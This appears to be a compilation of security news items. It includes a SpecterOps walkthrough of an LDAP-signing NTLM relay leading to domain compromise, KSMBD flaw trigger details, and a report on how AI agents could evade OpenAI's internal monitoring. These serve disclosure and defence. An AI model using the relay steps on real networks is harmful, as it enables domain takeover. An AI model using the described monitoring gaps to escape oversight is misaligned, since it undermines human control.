Trust Is Not What It Seems — And Fraudsters Are Counting on It

Threat actors don't need to rely on malware to breach organizations anymore. They're simply calling help desks and politely asking for access, with a little help from artificial intelligence.

After a disruptive cyberattack hits, customer trust can take a while to rebuild. But now, threat actors are impersonating trusted brand names and existing customer accounts to abuse customer relations.

"Trust has become easier to exploit and harder to establish," warned a new TransUnion report. Threat actors use social engineering, deepfake technology, text spoofing, compromised credentials, and artificial intelligence (AI) to become whoever they need to be, whether that's a new or existing customer, or the organization itself.

Many organizations have improved security during sign-up and onboarding processes in light of more attacks. Organizations must continue to adapt since "most fraud now occurs after the customer relationship has already been established," according to the report. It found 58% of organizations were very or extremely concerned that fraud is evolving faster than their abilities to detect or prevent it.

The use of synthetic identities plays a big role in that. Threat actors can spin those up with ease, given widespread data breaches that exposed millions of individuals’ sensitive information, explains Brian Killeen, vice president of global identity solutions at TransUnion. Scammers will replicate leaked documents or use deepfakes to bypass identity proofing checks at onboarding.

The credit reporting agency found that account login accounted for 53% of all suspected digital fraud during the first half of 2026. Conducting scams has become easier for threat actors as tooling advances, Killeen adds. Threat actors aren't just automating account creation with scripts; they're actually building logic into automated pipelines to reverse-engineer security controls, he explains. That allows them to pinpoint exactly where and how defenses are blocking their attacks.

"Trust is under pressure," Killeen tells Dark Reading.

You Can't Spell “Impersonation” Without AI

In 2025, the FBI warned of an uptick in cybercriminals targeting employee self-service portals — websites used for payroll, benefits, and other human resources services – at both private companies and government agencies. Threat actors created fake search engine advertisements to lure users into visiting malicious sites that mimicked legitimate companies' logos and layouts. Once the victim logged in, attackers stole login credentials and financial information.

And the situation continues to evolve. Over the past year, AI has helped criminals to personalize attacks and spread them across channels— from email to Teams. Deepfakes add another layer of credibility, explains Javvad Malik, lead chief information security officer (CISO) advisor at Knowbe4.

Amid booming AI adoption that security has trouble matching, the security awareness company is also seeing more attempts to exploit AI systems, or to take advantage of poorly configured AI tools and agents, he adds.

"The social engineering techniques remain similar, but attackers are also using AI to find weaknesses and are beginning to target AI agents directly," Malik tells Dark Reading.

The AI attack surface is ripe for the taking. New research from Check Point on brand impersonation trends from Q3 flagged a phishing campaign where threat actors impersonated Anthropic's Claude assistant. Fraudulent emails, playing up urgency with a due payment notice, requested 500 euros with an "update payment" link intended to trick users into clicking, putting credentials and financial information at risk. Since April, Knowbe4 tracked a 228% increase in AI brand impersonation, says James Dyer, head of threat intelligence. Attackers are abusing the global focus on utilizing AI within businesses as a perfect covert operation for their phishing attacks, Dyer adds, warning that the problem compounds when attackers center their attacks around breaking news headlines.

A Moving Target

Attackers' methods have evolved from deploying malware to exploiting identity when it comes to attacks against customer relations because: Why take the time to write a script when they can just get a password reset, poses Dave Lewis, global advisory CISO at 1Password.

The industry spent a decade training people not to click links, and attackers responded by simply asking nicely, he adds. The most common type of attacks he's observed right now don't involve "anyone in a hoodie typing furiously," but instead phoning the help desk to manipulate users into giving away multifactor authentication (MFA) codes, which he labels "the most effective zero-day of 2026."

Walking in through the customer relationship management (CRM) system's front door is another tactic he's observed, pointing to the data-theft campaign against Salesforce customers that started in 2025 and continued into 2026.

"Nobody 'hacks' the CRM," Lewis tells Dark Reading. "They just log in with a key you handed to a vendor, or a guest account nobody remembers creating."

The target moved from the data center to the Software-As-a-Service (SaaS) layer, where one compromised integration gives attackers many targets per compromise. Detection lags because SaaS platforms log differently from traditional infrastructure, adds Lewis.

Threat actors also use AI to build voice deepfakes from executives' public recordings, deploy them in high-pressure desk calls, and then use AI again to move through hybrid environments within minutes of gaining access. But that doesn't exactly signal an increase in sophistication, Lewis says.

"Technical sophistication is down," he says. "Operational sophistication— research, patience, scripting, follow-through— is up. It's less of the 'evil genius' and more 'well-run call center with bad intentions'."

Recommendations: Rinse and Repeat

Killeen stressed that "what once looked legitimate and trusted can change" as threat actors slip further under the radar, cloaked behind more convincing and personalized impersonation tactics. Organizations across industries are seeing more scams, authorized fraud, and good customers being manipulated, he warns.

Organizations must learn and adapt quickly because attackers aren't wasting any time. Killeen recommends that organizations take a look at their existing controls to uncover vulnerable points and understand where the biggest losses are. Even if organizations stand up strong security at the front door, they could still fall victim to downstream risks.

"It's taking a risk-based approach, looking at things holistically, and how do you prioritize those things accordingly, based on your vulnerabilities," Killeen advises.

Killeen and Lewis agree that attacks against customer relations warrants checking every door leading into the CRM. That includes every OAuth application, integration, guest or portal user, and API key.

"Revoke anything without a named owner," Lewis adds. "Scope the rest. Repeat quarterly, because they grow back."

He also recommends that organizations fix the help desk process attackers continually abuse, rather than people who work it. Scripted identity verification for resets, callback to a number of record, and manager approval for any privileged or MFA reset are ways to reduce risk in that area.

"Drop speed metrics like average handle time for identity-sensitive support interactions," Lewis adds. “They drive agents to prioritize speed over verification.”

Holding less customer data is another area organizations can prioritize to limit risks. Implement retention limits on customer records, purge dormant accounts, and don't include production customer data in sandboxes, Lewis recommends.

"Data you don't hold can't be stolen," he says.

Red-team report found OpenAI utterly failed to monitor its agents during Hugging Face attack

news The Register · 2026-10-23 · ↗ original

An independent evaluation of OpenAI's internal misalignment monitoring system revealed that the system was not fit for purpose during a period when the company's bots were breaking into model-hosting platform Hugging Face. The safeguards weren't nearly strong enough. "The METR and Redwood employees discovered a number of novel vulnerabilities in the asynchronous internal misalignment monitoring system as it existed on and before July 21st," said evaluation partners METR and Redwood Research in a report released on Thursday. The system, since improved according to OpenAI, was intended to monitor AI agent behavior. But as described by METR and Redwood Research, its monitoring capability was incomplete and could be bypassed by the agents it was supposed to monitor. Bypassing the system wasn't always necessary because it wasn't always operative. Monitoring was suspended, for example, during compaction events. Compaction is a process by which AI models condense the data in their context window to make room for further input. And between May and July 2026, about 10 percent of eligible internal Codex traffic went unmonitored during compaction, according to the report. That gap was theoretically large enough to allow AI agents to postpone monitoring indefinitely: agents could further suppress monitoring by continuing to take actions without returning control to the user. "At the time of the exercise, the monitoring system triggered when agents returned control to the user, so during the time period when compaction events were not being monitored, agents could indefinitely postpone being monitored by simply continuing to take actions," the report explains. This is not to say that OpenAI agents necessarily did so – the actions they did take, against Hugging Face and other organizations, have now been well documented. But OpenAI's internal monitoring system could easily have missed any misbehavior, were the company's AI agents inclined to conceal their activities – by acting during compaction – or simply to operate in system blind spots. The report continues in this vein, citing not only monitoring gaps but poorly constructed software – dare we say vibe-coded? – that gave OpenAI agents the means to evade the shoddy monitoring. "We found a way Codex agents could in principle bypass Codex sandboxing and Auto-Review, allowing them to take any action that the host user could take," the report says. "We also discovered an exploit agents could use that would prevent hundreds of recent actions (including the actions involved in the exploit itself) from being monitored." The details of this exploit were redacted by OpenAI, but to summarize: the monitoring system that missed some traffic could be avoided by agents that were constrained by a non-working sandbox and had access to an exploit to evade monitoring. But that's not all. The evaluators found that AI agents could craft inputs that caused monitoring to fail, that there were two client-controllable headers capable of disabling the monitoring of new agents, and that there were two unmonitored agentic tools that were thought to be read-only but could be exploited to take arbitrary action in the sandbox – which as noted above leaked like a sieve. In conclusion, METR and Redwood Research propose that the agent monitoring systems used by AI companies actually work and are robust enough to "withstand deliberate, strategic, and sustained attacks from highly capable internal agents at scale." ®

Microsoft says Teams will begin using AI-powered phishing detection in early November 2026 to detect malicious behavior in messages.

The rollout is part of a targeted release phase expected to end by mid-November, with the new security feature likely reaching general availability worldwide between early and mid-December.

Microsoft first revealed in a Microsoft 365 Roadmap entry last week that the AI-powered phishing detection will use conversation context (without retaining message content) to identify phishing and suspicious behavior in higher-risk messaging scenarios, such as external first-contact chats.

"Microsoft Teams is introducing AI-powered, context-aware phishing detection to help identify phishing, social engineering, impersonation attempts, and deceptive intent," the company said in a Microsoft 365 Message Center update on Wednesday.

"This capability is used only for security protection and not for productivity, summarization, advertising, user monitoring, or other non-security purposes," Microsoft said. "Customer message content is not retained by the detection system for model training or other secondary uses."

It also began rolling out a new Teams meeting protection policy in August that lets admins block all identified external bots automatically from joining meetings.

FCC bans two devices with surveillance chips linked to Huawei

news The Record · 2026-10-23 · ↗ original

The Federal Communications Commission (FCC) on Thursday said it won’t let devices made with surveillance chips manufactured by a Chinese tech firm enter the U.S. market, the first instance of such a ban following the agency’s implementation of tough new rules.

The banned items — a wireless video transmitter and dashboard camera — are made with chips manufactured by Huawei subsidiary HiSilicon, which markets its products as “designed for the surveillance market” with “[b]uilt in detection algorithms for human faces,” the FCC said.

New rules took effect on October 13 that bans devices containing smart components made by companies on a so-called covered list, an official public directory the agency maintains under a 2019 regulation identifying video surveillance, communications and general technology products believed to threaten national security. HiSilicon was included on the list.

Before the new regulations were implemented, agency rules did not ban “otherwise lawful devices” from including component parts manufactured by covered list entities, the press release said.

“The FCC will continue to act with vigilance in protecting and promoting America’s national security,” Chairman Brendan Carr said in a statement that called the products potential spyware. “Video devices containing surveillance chips produced by Covered List entities pose an obvious and unacceptable risk to the nation and our people.”

Huawei did not immediately respond to a request for comment.

Signed, Sealed, and Relayed, NTLM-style: Bypassing LDAP Signing Through Reauthentication

red-team SpecterOps · 2026-10-23 · ↗ original

For years, we thought LDAP and SMB signing protected us from NTLM relay attacks. However, we found that both protocols could be relay targets through re-authentication on a connection the attacker already owned. Signing was still enforced, just with the attacker known session key. Microsoft fixed SMB quietly in September 2026 and LDAP in October 2026. Every Windows Server from 2016 to 2025 was vulnerable to NTLM relay attacks, even with signing enforced in both protocols.

Introduction

Traditionally, LDAP signing was considered one of the “effective mitigations” against NTLM relay attacks. So, naturally, we had to ruin it. To circumvent LDAP signing, we first establish a signed LDAP connection to the DC using valid credentials or an anonymous security context and keep the session key. We then coerce a victim and relay their NTLM authentication over that existing LDAP connection, slipping our malicious LDAP operation into the same signed SASL record as the victim’s NTLM AUTHENTICATE message. The DC verifies the signature using our session key, switches authorization to the victim’s identity, and executes the malicious LDAP operation with the victim’s privileges. Microsoft patched this in October of 2026, but every Windows Server was vulnerable until then.

You’re probably thinking: “So what, Raj? Why should I care?” This bypass enables machine account NTLM authentication from a domain controller over SMB to be relayed to LDAP on another domain controller, from an unauthenticated or unprivileged context.  Relay to LDAP enables the total compromise of the victim domain controller via computer takeover primitives such as Kerberos resource-based constrained delegation (RBCD)  and shadow credentials, which then leads to DCSync and complete domain and forest compromise.

  • NTLM Relay

Specifically, the model excelled at reverse engineering the DLLs under guidance and pinpointing the exact bug, which significantly reduced the research time. We reported this vulnerability to Microsoft on October 6, 2026 but we never received a response to that MSRC report. The fix shipped on October 13, 2026 update, so we can’t say whether our report had anything to do with it.

We independently identified a similar vulnerability in SMB, and Microsoft patched it quietly in September 2026. Another researcher also noticed that silent patch and published a blog, Defeating Enforced SMB Signing. This blog post describes an LDAP variant that we found in September 2026.

Background: Why Signing Was Supposed to Stop NTLM Relay

NTLM relay attacks used to be straightforward: an attacker positioned between a client and server could relay the NTLM authentication exchange and authenticate to the server as the client. 

Microsoft introduced NTLMv2 to strengthen NTLMv1’s authentication and session security. NTLMv2 supports signing to protect message integrity and sealing to encrypt messages. Later, Extended Protection for Authentication (EPA) added channel and service binding to help prevent relay attacks. 

Since then NTLM relay attacks have become more complicated, especially cross-protocol relaying. Windows Server 2025 raises the baseline further. SMB signing is now required by default for outbound connections, and new Active Directory deployments require LDAP signing by default. Relaying from SMB to LDAP is still harder because the two protocols handle signing differently. SMB negotiates signing on its own, but the Windows SMB client still sets the signing flag in its NTLM messages. LDAP has no separate negotiation, so it relies on NTLM to decide whether signing is used. When we relay that SMB authentication to LDAP, the DC honors the flag and expects every message after the bind to be signed.

The ordinary relay was blocked when SMB or LDAP required signing because we did not know the victim’s exported session key. LDAP over TLS was blocked when channel binding was required. This is where relaying from HTTP became easier because HTTP does not provide per-message signing and it doesn’t even negotiate a session key; when HTTPS is used, TLS provides transport integrity instead. As a result, coercing a victim through WebClient generally produces an NTLM exchange that is easier to relay and never negotiates signing. WebDAV also allows us to capture that authentication on an external host and route it back into the target environment through attacker-controlled infrastructure. Elad Shamir calls this technique “There and Back Again,” and Logan Goins demonstrates the complete workflow in this blog post.

NTLMv2 Basics: Session Keys, Signing, and the MIC

We will briefly cover NTLMv2 terms so we are all on the same page when these terms come up later. During normal NTLMv2 authentication, the client uses its NT hash, uppercased username and domain name to derive the ResponseKeyNT through the NTOWFv2 function. It then builds the NTLMv2_CLIENT_CHALLENGE structure, which contains a timestamp, a client challenge, and AV pairs. The client then computes the NTProofStr by running HMAC-MD5 over the server challenge and the NTLMv2_CLIENT_CHALLENGE structure using the ResponseKeyNT as the key. The final NTLMv2 response is the concatenation of the NTProofStr and the NTLMv2_CLIENT_CHALLENGE structure. So the AV pairs are protected by the NTProofStr, and changing them would invalidate that proof. 

For NTLMv2, the client computes a SessionBaseKey by running HMAC-MD5 over the NTProofStr using the ResponseKeyNT as the key. The KeyExchangeKey is the same as SessionBaseKey and we will refer to it as the SessionBaseKey in this blog post. When key exchange is negotiated for signing or sealing (encryption), the client generates a random 16-byte ExportedSessionKey and encrypts it with RC4 using the SessionBaseKey. That encrypted key is included in the AUTHENTICATE message. The ExportedSessionKey is used as input to derive signing and sealing keys by both LDAP and SMB protocols, but each protocol derives its own signing and sealing keys differently. 

Another important concept is the Message Integrity Code (MIC). The MIC protects the entire NTLM exchange from tampering. The MsvAvFlags AV pair in the AUTHENTICATE message tells the server that a MIC is present. The client computes the MIC over all three NTLM messages using the ExportedSessionKey, so any modification to any of those messages invalidates the MIC, resulting in the server rejecting authentication.

How LDAP signing and channel binding stop NTLM relay

Typically, if a target DC requires LDAP signing, we cannot perform NTLM relay against LDAP because we don’t know the victim’s (client’s) session key. The signing requirement is negotiated during the SASL bind and protects the LDAP messages sent after authentication, not just subsequent Bind requests. Without the session key, we cannot generate valid signatures for LDAP messages.

When relaying SMB to LDAP, things get more complicated because both protocols have their own way of negotiating signing. SMB always negotiates signing, and the NTLMSSP_NEGOTIATE_SIGN flag will always be set to 1 for a victim coerced via SMB. The problem arises when the LDAP server honors that request even though the DC does not require signing for LDAP. So we can’t relay SMB to LDAP because LDAP enforces the signing the victim requested. This applies to typical NTLMv2 exchanges, with exceptions such as legacy NTLMv1 or vulnerable implementations.

LDAP also supports channel binding when authentication happens over LDAPS (with TLS). Signing protects the LDAP messages, while channel binding ties the authentication to the TLS channel. Channel binding only applies to LDAPS, and it doesn’t apply to LDAP.

Traditionally, we could bypass LDAP signing and channel binding if only one protection is enforced. If LDAP signing is enforced but channel binding is not, we can target LDAPS, and since TLS traffic is signed, it satisfies the DC’s signing requirements. If channel binding is enforced but LDAP signing is not required, we can instead target LDAP, where there is no TLS channel to bind the authentication to. After authentication, we may upgrade that connection with StartTLS because TLS is established after the bind, and channel binding was not checked during that authentication exchange. The benefit of using StartTLS is that it allows performing sensitive operations such as password changes or resets, assuming the relayed account has the necessary permissions.

With LDAP signing required and channel binding set to Always, NTLM relay to LDAP should be impossible. However, as we’ll see, the word itself says “I’m possible”.

How the LDAP signing bypass works

Buckle up! Now the fun begins. We identified a way to bypass LDAP signing by coercing a Windows SMB client and relaying its NTLM authentication to a domain controller that requires LDAP signing. First, we establish a signed LDAP connection with a session key we know. We can do this with valid domain account credentials, or we can even establish an anonymous NTLM SASL context. We will call this identity X. We then relay the victim’s (identity Y) NTLM authentication over that existing signed connection.

You might be asking why the victim has to be an SMB client. If WebDAV can be coerced too, why not relay that? This is where the SMB client turns out to be the important part. The Windows SMB client sets the NTLM signing flag in its authentication, which is the exact thing that made SMB to LDAP relaying hard before. A WebDAV client doesn’t set that flag, and when the victim authenticates over HTTP, the DC rejects the stacked operation with operationsError (0x4DC) because a successful bind had not completed. So the signing flag that used to be the problem is what makes this technique work.

Before going further, we need to explain SASL. SASL (Simple Authentication and Security Layer) is a framework that lets a protocol like LDAP plug in an authentication mechanism, such as NTLM or Kerberos, and optionally add a layer that signs and encrypts every message after the bind. Once that layer is on, LDAP sends a SASL record, which is a length-prefixed block that is signed (and optionally sealed) as one unit and can hold more than one LDAP message. NTLM SASL signing creates a signing key that is associated with X, and we know that key. The important part is that one signature covers everything inside a SASL record.

The interesting part is what happens when we relay Y’s final NTLM AUTHENTICATE message. Instead of sending it on its own, we put the BindRequest carrying that message and our malicious LDAP ModifyRequest (e.g., modifying msDS-AllowedToActOnBehalfOfOtherIdentity or msDS-KeyCredentialLink attributes for Kerberos resource-based constrained delegation or shadow credentials, respectively) into one SASL record. These are two separate LDAP messages inside the same protected SASL record, and we sign the whole SASL record with the session key we already know (X). The DC verifies the entire SASL record once using X, then processes the BindRequest and switches the connection’s identity to Y. When it reaches our modification, it runs the LDAP operation with Y’s privileges, even though we supplied the LDAP operation and signed the SASL record with X.

This does not give us the victim’s session key (Y). If we send another SASL record signed with X, the DC rejects it because the connection now requires Y’s session key. The issue is what happens inside the SASL record we already sent. Its contents pass the signature check under our original security context (X), but the modification runs under Y’s identity after the bind completes.

This technique bypasses LDAP signing, not channel binding. Channel binding only applies to LDAPS, because it ties authentication to the TLS channel, and LDAP (389/TCP) has no TLS channel to bind to. The domain controller we tested against had both LDAP signing and channel binding enforced, and the attack still worked over 389/TCP. If 389/TCP is blocked then this technique will not work against LDAPS (636/TCP).

So why doesn’t the signing bypass itself carry over to LDAPS? The key difference between signed LDAP on 389/TCP and LDAPS on 636/TCP is where the protection is applied. LDAPS relies on TLS to sign and encrypt the connection, while NTLM only authenticates the user inside it. The TLS keys are associated with the connection and not with X, and Windows does not allow NTLM SASL signing or sealing over an existing TLS connection. So on LDAPS there is no signing key that belongs to X, and no signed SASL record to stack Y’s authentication and our operation into. This is why the LDAP signing bypass on 389/TCP does not transfer directly to LDAPS.

The attack sequence follows:

  1. The attacker coerces the victim into authenticating over SMB
  2. The victim’s SMB client connects to the attacker and begins session setup
  3. The attacker establishes a signed LDAP session through GSS-SPNEGO using either valid domain credentials or, where accepted, anonymous NTLM SASL authentication, with a session key known to the attacker
  4. The victim’s SMB client sends an NTLM NEGOTIATE message
  5. The attacker carries that message in a GSS-SPNEGO SASL BindRequest over the existing protected LDAP connection
  6. The target returns an NTLM CHALLENGE message through GSS-SPNEGO, protected by the existing LDAP session
  7. The attacker forwards the NTLM CHALLENGE message to the victim’s SMB client
  8. The victim’s SMB client returns the final SPNEGO response carrying the NTLM AUTHENTICATE message
  9. The attacker sends a GSS-SPNEGO BindRequest carrying that response, followed by a separate LDAP ModifyRequest, together in one SASL record signed using the attacker’s original LDAP session key
  10. The target verifies the SASL record using the attacker’s original session key, completes the bind as the victim, and processes the following modification using the victim’s privileges

Walkthrough: Relaying SMB to LDAP With Signing Required

Now let’s dive deeper into this vulnerability and analyze how it works and what made it possible.

In this example, we have three hosts. The domain controller is LYS-DC (10.4.10.47), the attacker is a Kali host (10.4.10.233), and the victim is LYS-SRV22 (10.4.10.48). The DC was running build 26100.33451 (KB5129235, the September 2026 cumulative update) before the October 2026 update (KB5126646, build 26100.33648) introduced the fix.

First, we coerce the victim into connecting to the attacker host. The victim opens an SMB connection and sends an SMB NEGOTIATE request, which agrees on the SMB dialect and lists the security mechanisms it supports. We don’t respond yet. The TCP layer acknowledges the packet, but the relay holds the victim at this point until our LDAP connection is ready.

In frame 12, we bind to the DC over LDAP as LYS\LYS.LOW and keep the session key from that authentication. Every LDAP message after the bind has to be signed with this key, and since we authenticated as LYS.LOW we know it.

The session key shown above is in encrypted format so we can’t directly use it.

In frame 28, we resume the victim’s SMB connection and the victim (LYS\LYS-SRV22$) sends us its NTLM NEGOTIATE message. As with any Windows SMB client, the NTLMSSP_NEGOTIATE_SIGN flag is set, as you can see in the screenshot below. 

In frame 29, we relay that NTLM NEGOTIATE message to the DC inside a Bind request. Because the connection is already signed, the Bind travels as a SASL-protected message signed and sealed with LYS.LOW’s session key. That is why the payload looks encrypted in the screenshot. We wrote a small Wireshark plugin that decrypts these messages with the LYS.LOW key so we can see what is being sent, which we will show later.

In frames 30 to 33, we finish the NTLM exchange. The DC sends a NTLM CHALLENGE message to us, we forward it to Y (LYS\LYS-SRV22$) over SMB, and Y answers with its NTLM AUTHENTICATE message. We only pass the messages between Y and the DC. We never learn Y’s password or session key.

Frame 34 is where the attack happens. Instead of sending Y’s AUTHENTICATE message on its own, we put two LDAP messages into one SASL record and sign it with X’s session key. The first is a BindRequest carrying Y’s AUTHENTICATE message. The second is a ModifyRequest that writes msDS-AllowedToActOnBehalfOfOtherIdentity on LYS-SRV22$, with a security descriptor that grants an account we control (HXRBOX2$). The DC verifies the signature on the SASL record once, using X’s key. It then completes the bind as Y and processes the ModifyRequest as Y too. So the whole resource-based constrained delegation (RBCD) attack happens in one signed SASL record.

Root Cause: Inside LDAP_CONN::ProcessRequestEx

To uncover what happens on the domain controller side, the core of the vulnerability lives inside the LDAP_CONN::ProcessRequestEx function. This function runs for every LDAP request received on a connection. It first checks whether signing was negotiated on the connection, and if it was, it expects the message to be signed with the negotiated signing key. It verifies this by calling LDAP_REQUEST::DecryptSignedOrSealedMessage, which checks the SASL record against the key of the connection’s current security context. One thing to note here is that signing only starts after the NTLM authentication exchange is completed. Since we were the ones who authenticated on this connection, we already possess the session key at this point. So when we perform the reauthentication, we continue the open SMB connection with the victim and relay the NTLM messages back and forth with the DC. Once we have the victim’s final NTLM AUTHENTICATE message, we relay it in a Bind request together with our own LDAP operation, both in the same SASL record signed with our key.

Next, ProcessRequestEx calls the LDAP_CONN::BindRequest function, where the victim’s identity is validated. Within that function, it later calls LDAP_CONN::MoveSecurityContext, LDAP_CONN::InstallNewSecurityContext, and LDAP_CONN::SetSecurityContextAtts,  which switch the connection’s authorization to the victim’s.

After LDAP_CONN::BindRequest returns, there is still data left in the SASL record, so ProcessRequestEx processes the next message and calls the LDAP_CONN::ModifyRequest function. This is where our stacked LDAP operation goes, the one we wanted to perform with the victim’s authorization. Since the authorization context was already switched to the victim during the Bind, the Modify executes as the victim. So basically there is no check that notices the identity changed partway through the SASL record, or that anything after the reauthentication should be verified with the new signing key, which only the victim holds. The SASL record gets verified just once, with the session key that we control, and never again after that.

How Microsoft Patched the LDAP Signing Bypass

Microsoft fixed this issue by giving every LDAP connection a counter that tracks its identity. So first it captures a baseline. Whenever new client data arrives, LDAP_REQUEST::ReceivedClientData reads the connection’s current identity counter and saves a copy of it inside the request itself. This is like a snapshot of which identity the connection was authenticated as when that data came in. Nothing is validated or blocked at this point – it’s just recorded.

That counter only increments when the connection’s identity actually changes, and that is exactly what our relayed Bind does. When the Bind completes, LDAP_CONN::SetSecurityContextAtts installs the victim’s security context and increments the same counter, which leaves a trace that the switch happened.

Later, after the Bind in that request has switched the connection over to the victim, the counter on the connection has increased, but the copy saved in the request hasn’t. So when ProcessRequestEx compares the two, and they don’t match, it knows the identity changed partway through the SASL record. It then throws away the rest of the SASL record, which means our stacked Modify never runs.

How to Defend Against NTLM Relay to LDAP

Signing alone was never a complete defense against NTLM relay. To close the gap this research exposed:

  • Patch domain controllers first. Install the October 2026 cumulative update (KB5126646) on every domain controller. This fixes the LDAP signing bypass.
  • Patch for the SMB fix. Install the September 2026 update (KB5122882) on every server to close the SMB signing bypass.
  • Enforce LDAP signing and channel binding together. Either one on its own leaves a path open. With both enforced, an attacker can’t switch to LDAPS or plain LDAP to get around the one that’s missing.
  • Restrict LDAP on 389/TCP where you can. The bypass ran over 389/TCP. If 389/TCP is blocked then this technique fails.
  • Reduce NTLM wherever possible. Every NTLM authentication you remove is one less thing an attacker can relay.

The last two recommendations are more complicated and may be aspirational goals for some organizations, because legacy applications often depend on plain LDAP and NTLM.

Frequently Asked Questions

What is the LDAP signing bypass? 

It is an NTLM relay technique that worked against domain controllers even when LDAP signing was required. An attacker opens a signed LDAP connection with a session key they know, relays a victim’s NTLM authentication over that connection, and slips a malicious LDAP operation into the same signed message. The domain controller checks the signature with the attacker’s key, then runs the operation with the victim’s privileges.

Is LDAP signing enough to stop NTLM relay attacks? 

Not on its own. Before the October 2026 update, every Windows Server 2022 and Windows Server 2025 domain controller we tested accepted relayed NTLM authentication with LDAP signing required. Install the update, enforce LDAP signing and channel binding together, and reduce NTLM wherever you can.

Does the LDAP signing bypass work against LDAPS? 

The technique targets LDAP on 389/TCP. If 389/TCP is blocked then this technique will not work against LDAPS (636/TCP).

Which Windows Server versions were vulnerable? 

We tested against Server 2016 domain controller and above, and it was vulnerable until the October 2026 cumulative update.

Does the attacker need domain credentials? 

Not necessarily. The attacker needs a signed LDAP session with a session key they know. That can come from valid domain account credentials or, where the domain controller accepts it, an anonymous LDAP connection. The attacker also needs to coerce a victim into authenticating to them.

What can an attacker do with the LDAP signing bypass? 

The attacker can make a domain controller authenticate to the attacker and relay the authentication to another domain controller to compromise the domain instantly. In our example, we relayed a server’s computer account and wrote msDS-AllowedToActOnBehalfOfOtherIdentity on that server to set up resource-based constrained delegation (RBCD).

Has Microsoft patched the LDAP signing bypass? 

Yes. We reported it to Microsoft on October 6, 2026, and Microsoft independently shipped a fix on October 13, 2026 (KB5126646). The patch tracks each LDAP connection’s identity with a counter. If the identity changes partway through a signed SASL record, the domain controller discards the rest of that SASL record, so the stacked operation never runs. Microsoft fixed the related SMB issue in September 2026.

PHP2Shell Exposure Depends on More Than Whether You Use PHP

red-team Horizon3.ai · 2026-10-22 · ↗ original

Disclaimer: This article is not a primer on how the CVEs (CVE-2026-109618/CVE-2026-109619) work. For that, see our PHP2Shell technical advisory. 

“We don’t use PHP” may describe your development stack, but it doesn’t directly describe every product, container, or hosted application your organization depends on.

There are two important challenges when confirming the exploitability of PHP2Shell. The first challenge is finding the affected runtime—including the copies another team or provider manages. The second is understanding whether an attacker can exploit it in that particular environment.

The PHP you didn’t choose

An organization doesn’t need to write PHP applications to depend on PHP. A third-party application may bundle its own runtime. A container may carry a different version from its host. A hosting provider may manage PHP beneath a site whose administrators only see the content-management interface.

These are sources to investigate, not evidence that every such product is affected. Establishing the actual exposure means identifying the actual runtime and checking the applicable vendor guidance. From a red-team perspective, the important question is which reachable systems depend on affected PHP, not which programming languages appear in the organization’s development standards.

That also changes who can fix the problem. Updating the PHP package on a server does not establish that a bundled copy inside a product or container has also changed.

Hosted applications change the responsibility

With a fully managed website, the customer may have neither visibility into the PHP runtime nor permission to patch it. With self-managed hosting, that responsibility may sit with the customer. 

For a managed service, ask the provider:

  • Does our service use an affected PHP runtime?
  • Has a release containing both fixes—or an applicable vendor backport—been deployed?
  • Have the relevant services and workers been restarted?
  • Does that confirmation cover our service and all relevant instances?

A statement that a provider offers patched PHP is less useful than confirmation that the patched runtime is serving your application.

Presence is only the beginning of exploitability analysis

Finding affected PHP establishes a remediation need. It does not, by itself, prove that a particular exploit will succeed.

PHP2Shell covers two related memory-handling failure patterns. The server integration, application behavior, configuration, and request lifecycle can influence which paths are reachable. For the stale-state vulnerability, the demonstrated mechanism involves the state surviving one request and being used by a later request handled by the same worker.

That is why a working exploit against one environment does not automatically establish identical results everywhere. It is also why an unsuccessful attempt does not establish that an affected runtime is safe. The useful finding is specific: which path was tested, under which conditions, with what observable result?

What our validation establishes

We’ve validated that these vulnerabilities can be feasibly exploited in practice, but it requires specific preconditions. We’re still characterizing those conditions and what they mean for real-world exposure; we’ll share further technical detail when it’s ready.

That is where our research stands. The conditions of our validated exploit should not be treated as an exhaustive description of every possible path covered by these vulnerabilities. As the work develops, we will distinguish what we have demonstrated from what remains under investigation.

Successful research validation and readiness for production assessment are also separate milestones. Getting an exploit, or even a reliable check, to work establishes a capability, but making that testing suitable for customer environments requires understanding its operational effects, defining its coverage, and interpreting its results accurately.

Our attack team is working on a reliable way to validate exposure. We want to be precise about what is ready rather than let the pace of the conversation outrun the evidence.

The blast radius depends on what the worker can reach

Once exploitation succeeds, the next question is what access it provides. Code execution begins with the web worker’s permissions. The potential business impact then depends on the data, credentials, and services accessible to that account.

A worker that can read application credentials may expose more than website content. Whether those credentials enable database access, access to another service, or further movement depends on their privileges and the surrounding environment. 

Investigate and remediate while the research continues

You do not need to wait for a complete map of exploitability to start addressing affected PHP. Teams can begin inventory and remediation while research continues. Find affected runtimes, establish who owns each one, and apply PHP or vendor fixes. Confirm that the corrected build is actually serving requests.

Where authorized validation is available, retest alongside that runtime evidence and the assessment’s coverage. An unsuccessful attempt tells you about the tested path under those conditions. It does not establish universal protection or rule out an earlier compromise.

PHP2Shell deserves an informed response: investigate dependencies you may have overlooked, examine the conditions that enable exploitation, and verify the changes you make.

Linux servers running KSMBD, the kernel's built-in SMB server, are exposed to two publicly reported remote code execution flaws rated 9.0 by Trend Micro's Zero Day Initiative, with no fix yet in the mainline kernel.

One of them, ZDI-CAN-33774, can be triggered before any network authentication. The other, ZDI-CAN-33549, requires the SMB Direct transport and an RDMA-capable network interface.

ZDI-CAN-33549 is an integer underflow in KSMBD's SMB Direct path. A client can supply RDMA buffer descriptors in which the first is longer than the declared payload, causing the server's size counter to wrap and allowing a subsequent memory copy to overrun the end of an allocated buffer.

It requires three things: an RDMA-capable interface (hardware or the rxe software driver), a writable KSMBD share, and a client negotiating SMB Direct.

ZDI-CAN-33774 requires no authentication, exposing any server running KSMBD on port 445. The flaw is a race in how KSMBD assigns its handler table: a burst of short SMB1 packets followed by an SMB2 packet in the same TCP write causes workers to handle SMB1 data with an SMB2 handler, reading past the end of the shorter buffer. Linux news site Phoronix said SMB Direct maintainer Stefan Metzmacher submitted a fix for ZDI-CAN-33549 targeting the next kernel development cycle, but this has not been confirmed elsewhere.

Fixes to mainline typically take weeks to reach stable branches and distribution kernels after that. Neither flaw has a CVE identifier, since the kernel project assigns those only after a stable-tree fix is available.

php2shell: Assessing Elastic detection coverage relevant to CVE-2026-109618 and CVE-2026-109619

threat-intel Elastic Security Labs · 2026-10-21 · ↗ original

